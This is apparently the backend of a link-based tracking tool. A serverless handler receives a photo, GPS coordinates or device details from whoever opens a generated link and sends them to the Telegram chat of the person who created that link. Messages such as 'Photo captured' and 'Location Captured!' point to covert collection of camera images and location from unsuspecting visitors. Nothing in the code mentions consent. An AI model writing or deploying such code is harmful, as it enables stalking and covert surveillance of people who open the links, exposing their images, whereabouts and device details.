export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;
  const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
  const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;

  const { linkId, type, photoData, coords } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // Look up who created this link
    let targetChatId = ADMIN_ID;
    
    try {
      const lookupResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
        headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
      });
      const jsonbinData = await lookupResponse.json();
      const links = jsonbinData?.record?.links || {};
      const linkData = links[linkId];
      if (linkData && linkData.creator_chat_id) {
        targetChatId = linkData.creator_chat_id;
      }
    } catch (e) {
      console.log('JSONBin lookup failed');
    }

    // Handle PHOTO
    if (type === 'photo' && photoData) {
      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');

      const boundary = 'boundary_' + Date.now();
      
      let body = '';
      body += '--' + boundary + '\r\n';
      body += 'Content-Disposition: form-data; name="chat_id"\r\n\r\n';
      body += targetChatId + '\r\n';
      body += '--' + boundary + '\r\n';
      body += 'Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n';
      body += 'Content-Type: image/jpeg\r\n\r\n';
      
      const bodyStart = Buffer.from(body, 'utf-8');
      const bodyEnd = Buffer.from('\r\n--' + boundary + '--\r\n', 'utf-8');
      const finalBody = Buffer.concat([bodyStart, buffer, bodyEnd]);

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': 'multipart/form-data; boundary=' + boundary,
          'Content-Length': finalBody.length.toString()
        },
        body: finalBody
      });
      
      const result = await response.json();
      console.log('Photo result:', JSON.stringify(result));
      
      if (!result.ok) {
        // Fallback: send as text
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: targetChatId,
            text: `📸 Photo captured (${Math.round(buffer.length/1024)}KB)`
          })
        });
      }
    }

    // Handle LOCATION
    if (type === 'location' && coords && coords.lat && coords.lng) {
      const message = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
🌐 https://www.google.com/maps?q=${coords.lat},${coords.lng}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    // Handle INFO
    if (type === 'info') {
      const { user_agent, screen_res, platform, language, hasCamera, hasLocation } = req.body;
      
      let message = `🛡️ **Device Info**\n\n`;
      message += `📱 ${platform || 'Unknown'}\n`;
      message += `🖥️ ${screen_res || 'Unknown'}\n`;
      message += `🗣️ ${language || 'Unknown'}\n`;
      message += `📸 Camera: ${hasCamera ? '✅' : '❌'}\n`;
      message += `📍 Location: ${hasLocation ? '✅' : '❌'}\n`;
      message += `⏰ ${new Date().toISOString()}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
}
